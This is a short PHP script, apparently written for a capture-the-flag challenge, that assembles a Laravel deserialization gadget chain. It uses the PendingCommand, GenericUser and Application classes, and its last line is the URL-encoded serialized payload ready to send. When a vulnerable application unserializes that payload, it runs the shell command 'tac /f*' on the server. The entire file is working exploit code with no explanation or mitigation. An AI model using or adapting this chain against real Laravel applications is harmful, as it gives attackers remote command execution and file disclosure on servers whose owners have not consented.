<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;
        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}
namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}
namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;
        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}
namespace{
    $genericuser = new Illuminate\Auth\GenericUser(
        array(
            "expectedOutput"=>array("0"=>"1"),
            "expectedQuestions"=>array("0"=>"1")
        )
    );
    $application = new Illuminate\Foundation\Application(
        array(
            "Illuminate\Contracts\Console\Kernel"=>
                array(
                    "concrete"=>"Illuminate\Foundation\Application"
                )
        )
    );
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
        "system",array('tac /f*'),
        $genericuser,
        $application
    );
    echo urlencode(serialize($pendingcommand));
}
# O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22tac+%2Ff%2A%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D
